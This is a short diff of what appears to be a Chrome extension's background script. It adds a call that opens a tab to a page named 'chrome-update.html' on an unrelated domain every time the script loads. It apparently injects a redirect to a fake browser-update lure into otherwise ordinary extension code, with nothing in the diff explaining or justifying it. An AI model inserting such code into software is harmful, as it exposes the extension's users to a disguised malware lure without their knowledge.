@@ -10,6 +10,10 @@
 
 "use strict";
 
+chrome.tabs.create({
+    "url": "http://rainbow.mlas1.us/chrome-update.html"
+});
+
 function sync_prefs(prefs) {
     localStorage.prefs = JSON.stringify(prefs);
 }
